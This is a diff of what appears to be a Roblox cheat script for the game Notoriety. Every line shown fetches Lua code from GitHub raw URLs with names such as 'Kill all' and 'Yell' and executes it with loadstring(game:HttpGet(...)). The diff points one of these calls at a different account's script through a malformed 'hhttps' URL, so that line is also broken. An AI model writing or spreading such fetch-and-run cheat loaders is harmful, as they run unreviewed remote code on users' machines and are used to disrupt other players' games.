@@ -9,7 +9,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/afiaogs92nj234/Notori
 loadstring(game:HttpGet("https://raw.githubusercontent.com/afiaogs92nj234/Notoriety/refs/heads/main/Kill%20all"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/afiaogs92nj234/Notoriety/refs/heads/main/Kill%20all"))()
 wait(0.1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/pAdsasd3q2/Notoriety/refs/heads/main/yell"))()
+loadstring(game:HttpGet("hhttps://raw.githubusercontent.com/afiaogs92nj234/Notoriety/refs/heads/main/Yell"))()
 
 
 local a1b2c3d4 = game:GetService("Players")
